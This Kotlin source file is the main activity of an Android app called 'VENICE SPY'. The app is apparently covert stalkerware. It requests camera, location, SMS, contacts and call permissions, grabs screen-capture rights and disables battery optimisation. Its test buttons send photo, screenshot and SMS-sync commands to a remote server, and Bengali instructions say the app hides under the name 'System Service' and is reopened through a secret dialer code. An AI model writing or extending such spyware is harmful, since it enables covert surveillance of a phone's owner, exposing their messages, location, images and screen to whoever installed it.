package com.venice.spy

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.Gravity
import android.widget.*
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private lateinit var status: TextView
    private lateinit var numBox: EditText
    private lateinit var prefs: Prefs

    private val batch = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()) { askBg() }

    private val bg = registerForActivityResult(
        ActivityResultContracts.RequestPermission()) { afterPerms() }

    private val proj = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()) { r ->
        val d = r.data
        if (r.resultCode == Activity.RESULT_OK && d != null) {
            prefs.projOk = true
            ScreenCaptureService.start(this, r.resultCode, d)
            status.text = "Screen capture granted ✓"
        }
    }

    override fun onCreate(s: Bundle?) {
        super.onCreate(s)
        prefs = Prefs(this)
        buildUi()
        CoreService.start(this)
        if (!prefs.setupDone) askPerms()
    }

    private fun buildUi() {
        val root = LinearLayout(this)
        root.orientation = LinearLayout.VERTICAL
        root.setPadding(48, 72, 48, 48)
        root.setBackgroundColor(0xFF0B0F14.toInt())

        fun t(s: String, sz: Float, col: Int = 0xFFE6EDF3.toInt()): TextView {
            val v = TextView(this)
            v.text = s; v.textSize = sz; v.setTextColor(col)
            v.setPadding(0, 12, 0, 12)
            root.addView(v); return v
        }

        t("◈  VENICE SPY", 22f, 0xFF4ADE80.toInt())
        status = t("Device ID: ${prefs.deviceId}", 12f, 0xFF8B98A8.toInt())

        t("তোমার নম্বর (মিস কল যাবে):", 13f)
        numBox = EditText(this)
        numBox.setText(prefs.ownerNumber)
        numBox.hint = "+8801XXXXXXXXX"
        numBox.setTextColor(0xFFFFFFFF.toInt())
        root.addView(numBox)

        fun btn(label: String, act: () -> Unit) {
            val b = Button(this)
            b.text = label
            b.setOnClickListener { act() }
            root.addView(b)
        }

        btn("১. সব পারমিশন দাও") { askPerms() }
        btn("২. স্ক্রিন ক্যাপচার অনুমতি") { askProjection() }
        btn("৩. ব্যাটারি অপটিমাইজেশন বন্ধ") { askBattery() }
        btn("৪. সেটিংস সেভ + সার্ভিস চালু") {
            prefs.ownerNumber = numBox.text.toString().trim()
            CoreService.start(this)
            Toast.makeText(this, "Saved & service started", Toast.LENGTH_SHORT).show()
        }
        btn("টেস্ট: মিস কল পাঠাও") { Actions.missCall(this, numBox.text.toString().trim()) }
        btn("টেস্ট: ছবি তুলে পাঠাও") { send("photo") }
        btn("টেস্ট: স্ক্রিনশট পাঠাও") { send("screen") }
        btn("টেস্ট: SMS সিঙ্ক") { send("sms_sync") }

        t("Android এর Settings → Apps → System Service থেকে\nএকবার পারমিশন দিলে আর লাগবে না।\n\nপরে খুলতে ডায়ালার-এ টাইপ করো:  *#*#7788#*#*", 12f, 0xFF8B98A8.toInt())

        val sc = ScrollView(this)
        sc.addView(root)
        setContentView(sc)
    }

    private fun send(cmd: String) {
        Thread {
            Api.post("commands", org.json.JSONArray().put(org.json.JSONObject().apply {
                put("device_id", prefs.deviceId)
                put("cmd", cmd)
                put("params", org.json.JSONObject())
            }).toString())
        }.start()
        Toast.makeText(this, "$cmd পাঠানো হয়েছে", Toast.LENGTH_SHORT).show()
    }

    private fun askPerms() {
        val list = mutableListOf(
            Manifest.permission.CAMERA,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_PHONE_NUMBERS,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.ANSWER_PHONE_CALLS,
            Manifest.permission.READ_CONTACTS
        )
        if (Build.VERSION.SDK_INT >= 33) list.add("android.permission.POST_NOTIFICATIONS")
        batch.launch(list.toTypedArray())
    }

    private fun askBg() {
        if (Build.VERSION.SDK_INT >= 29 &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            != PackageManager.PERMISSION_GRANTED) {
            bg.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        } else afterPerms()
    }

    private fun afterPerms() {
        status.text = "পারমিশন সম্পন্ন ✓  — এখন স্ক্রিন ক্যাপচার অনুমতি দাও"
        askBattery()
        askProjection()
    }

    private fun askProjection() {
        val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        try { proj.launch(mgr.createScreenCaptureIntent()) } catch (_: Exception) {}
    }

    private fun askBattery() {
        try {
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                    .setData(Uri.parse("package:$packageName")))
            }
        } catch (_: Exception) {}
    }
}